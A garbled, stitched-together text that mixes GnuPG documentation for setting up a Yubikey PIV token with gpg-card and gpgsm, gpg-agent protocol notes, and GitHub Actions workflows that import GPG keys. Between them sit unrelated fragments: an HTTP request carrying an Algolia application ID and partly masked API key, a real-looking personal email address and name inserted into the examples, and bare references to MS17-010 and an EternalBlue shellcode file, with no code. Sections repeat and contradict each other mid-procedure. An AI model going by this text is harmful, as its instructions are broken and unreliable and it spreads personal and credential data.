+PIV authentication’ key with ssh: + +$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) + +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: +Email address: otto@example.net +Comment: +You selected this USER-ID:

"otto@example.net"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid otto@example.net +$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available. + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save +Now you can use your PIV card also with gpg. + public-key

diff --git a/ReadMe.md b/ReadMe.md index 7278f80..41b298d 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -709,7 +709,844 @@ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt +# MS17-010 +# 000006 +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.co
m> +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
PIV authentication’ key with ssh:
+$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) +ssh-add with the uppercase ‘-L +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: keith bieszczat +Email address: 6309304695z@gmail.com +Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator +You selected this USER-ID:

"6309304695z@gmail.com"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid 6309304695z@gmail.com +

run gpg in --expert mode
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available.
+sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save + +/* 32A19-D90712
+LEVEL-5 CLEARANCE ONLY

‘--force’ +authentication key +-header-'010203040506070801020304050607080102030405060708' +SETDATA hexstring +to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
PKSIGN keyid +where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
PKSIGN --hash=algoname keyid +READKEY hexified_certid +READCERT hexified_certid|keyid +SERIALNO +Return the serial number of the card using a status response like:
S SERIALNO D27600000000000000000000
WRITEKEY [--force] keyid +SETDATA hexstring +to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
PKDECRYPT keyid +CHECKPIN idstr +RESTART +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+./configure --sysconfdir=/etc --localstatedir=/va +CN=Wurzel ZS 3,O=Intevation GmbH,C=DE

A6935DD34EF3087973C706FC311AA2CCF733765B S
CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  # Key added on: 2011-07-20 20:38:46
  # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
  34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/ +gpg-connect-agent 'help COMMAND' /bye +SETKEY +Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. +

PKDECRYPT +The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END +Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
(enc-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. + +If the decryption was successful the decrypted data is returned by means of "D" lines. + +Here is an example session: +

C: PKDECRYPT
S: INQUIRE CIPHERTEXT
C: D (enc-val elg (a 349324324)
C: D (b 3F444677CA)))
C: END
S: # session key follows
S: S PADDING 0
S: D (value 1234567890ABCDEF0)
S: OK decryption successful +The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has +SIGKEY +This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
SETHASH --hash=| +sig-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+The operation is affected by the option +

OPTION use-cache-for-signing=0|1 +The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+Here is an example session: +

C: SIGKEY
S: OK key available
C: SIGKEY
S: OK key available
C: PKSIGN
S: # I did ask the user whether he really wants to sign
S: # I did ask the user for the passphrase
S: INQUIRE HASHVAL
C: D ABCDEF012345678901234
C: END
S: # signature follows
S: D (sig-val rsa (s 45435453654612121212))
S: OK
GENKEY [--no-protection] [--preset] [<cache_nonce>] +Invokes the key generation process and the server will then inquire on the generation parameters, like:
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END +The format of the key parameters which depends on the algorithm is of the form:
(genkey
 (algo
   (parameter_name_1 ....)
     ....
   (parameter_name_n ....)))
+If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: +

(public-key
  (rsa
(n )
(e ))) +Here is an example session:
C: GENKEY
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END
S: D (public-key
S: D (rsa (n 326487324683264) (e 10001)))
S OK key created
ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> +LISTTRUSTED +GpgAgent returns a list of trusted keys line by line:
S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK +The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. +Ok +Finally a client should be able to mark a key as trusted:
MARKTRUSTED fingerprint "P"|"S" +The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
S: INQUIRE TRUSTDESC
C: D Do you trust the key with the fingerprint @FPR@
C: D bla fasel blurb.
C: END
S: OK +GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
            [--qualitybar] cache_id                \
            [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] + +HAVEKEY keygrips

GET_CONFIRMATION description
LEARN [--send] +UPDATESTARTUPTTY +SETDATA hexstring
PKSIGN keyid
PKSIGN --hash=algoname keyid
+READCERT hexified_certid|keyid +READKEY hexified_certid +SETDATA hexstring +d +

PKSIGN keyid
LEARN
PKSIGN --hash=algoname keyid
+WRITEKEY [--force] keyid +WRITEKEY [--force] keyid +PASSWD [--reset] [--nullpin] chvno +CHECKPIN idstr +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +this: +

S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import + +command --locate-external-key +command --locate-external-key +github/workflows/release.yml: +ldap://keys.(thedomain) +‘--auto-key-locate

--auto-key-locate +--auto-key-retrieve
honor-keyserver-url
+-sig-keyserver-url +--recv-key +honor-keyserver-url +--use-agent +--gpg-agent-info + + +--no-random-seed-file +Host: c7-use-3.algolianet. com +Accept: / +Sec-Fetch-Site: cross-site +Accept-Language: en-US, en; q=0.9 +Accept-Encoding: gzip, deflate, br +Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B +Origin: https://dashboard.algolia.com +User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe +x-algolia-api-key: b3cf*************************米** +Content-Length: 27 +Connection: keep-alive +Content-Type: application/x-www-form-urlencoded +Sec-Fetch-Dest: empty + +scdaemon.conf +1 +HKCU\Software\GNU\GnuPG:DefaultLogFile, +--debug-level level +HKCU\Software\GNU\GnuPG:DefaultLogFile, +scd-event +HKCU\Software\GNU\GnuPG:HomeDir +HKCU\Software\GNU\GnuPG:DefaultLogFile, +reader_n.status +HKCU\Software\GNU\GnuPG:HomeDir + +trustlist.txt file +gpg-agent.conf +HKCU\Software\GNU\GnuPG:HomeDir +name: release +debug-pinentry +--debug 1024 + +global trustlist (/usr/local/etc/gnupg/trustlist.tx + +Active cards +Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. +gpg-connect-agent updatestartuptty /bye +Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: + +gpg-connect-agent /bye +--scdaemon-program filename +Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf +--check-passphrase-pattern file +--check-sym-passphrase-pattern file +Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) +bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe +Keys listed in the sshcontrol file +--disable-extended-key-format +These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. + +--enable-ssh-support +--enable-win32-openssh-support +--enable-putty-support + +gpg-connect-agent 'GETINFO s2k_count' /bye +gpg-connect-agent 'GETINFO s2k_time' /bye +To view the auto-calibrated count use: + +gpg-connect-agent 'GETINFO s2k_count_cal' /bye +--ssh-fingerprint-digest +Keys listed in the sshcontrol file + +Active card +gpg-connect-agent /bye +bashrc or whatever initialization file is used for all shell invocations: + +GPG_TTY=$(tty) +export GPG_TTY +--daemon [command line] +server + +agent-program file ¶ +Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. + +--gpg-program file +Specify a non-default gpg binary to be used by certain commands. + +--gpgsm-program file +Specify a non-default gpgsm binary to be used by certain commands. + +--chuid uid +Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. + +LANG [--clear] +Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] +NAME [--clear] +PRIVATEDO [--clear] n [< file] file +READCERT [--openpgp] certref > file ¶ +Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". +URL [--clear] +gpg's. --fetch +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref

--openpgp +file +fpr. +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. +CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ +Serial number +A hex-string with the serial number of the card.
+Type +This gives the type of the card’s application. For example "OpenPGP" or "PIV". + +Keygrip +A hex-string identifying a key. + +Keyref +The application slot where the key is stored on the card. For example "OpenPGP.1" + +Status +The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. + +YUBIKEY cmd args +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV Application PIN +This is the string 123456. + +PIN Unblocking Key +This is the string 12345678. +list (the string gpg/card> +card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] +on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - uses: cli/gh-extension-precompile@v1
   with:
     go_version: "1.16"
+Then +- uses: cli/gh-extension-precompile@v1

env:
CGO_ENABLED: 1 +- uses: cli/gh-extension-precompile@v1
with:
build_script_override: "script/build.sh" +name: release
+on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - id: import_gpg
   uses: crazy-max/ghaction-import-gpg@v5
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.GPG_PASSPHRASE }}
 - uses: cli/gh-extension-precompile@v1
   with:
     gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS +gpg --armor --export-secret-key joe@foo.bar | pbcopy + +# Ubuntu (assuming GNU base64) +gpg --armor --export-secret-key joe@foo.bar -w0 | xclip + +# Arch +gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i + +# FreeBSD (assuming BSD base64) +gpg --armor --export-secret-key joe@foo.bar | xclip + +name: import-gpg + +on:

push:
branches: master
+jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
 -
   name: List keys
   run: gpg -K
+name: import-gpg + +on:

push:
branches: master
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
     fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
 -
   name: List keys
   run: gpg -K
+pub ed25519 2021-09-24 [C]

 87F257B89CE462100BEC0FFE6071D218380FDCC8
 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid [ unknown] Joe Bar joe@bar.foo +sub ed25519 2021-09-24 [S]

 C17D11ADF199F12A30A0910F1F80449BE0B08CB8
 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg +/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add + +application-priority piv +to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. + +With one of these methods employed the list command of gpg-card shows this: + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key +list --cards +well. The PIV authentication key (internal reference PIV.9A +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption + +gpg/card> auth 010203040506070801020304050607080102030405060708 +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected

‘--force’ +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpg +self-signed X.509 certificate (exit the gpg-card tool, first): + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +gpgsm --with-keygrip -k 6309304695z@gmail.com +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> 6309304695z@gmail.com +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: 6309304695z@gmail.com
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +‘gpgsm --learn’ +Digital signature’ key +gpg-card:010203040506070801020304050607080102030405060708 + +shellcode/eternalblue_sc_merge.py + +gpg/card> writecert PIV.9C < sign.crt on: push: branches: master

AUTHENTICATE [--setkey] [--raw] [< file]|key] AUTH and set key

GENERATE [--force] [--algo=algo{+algo2}] keyref Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶ L

READCERT [--openpgp] certref > file ¶

openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"

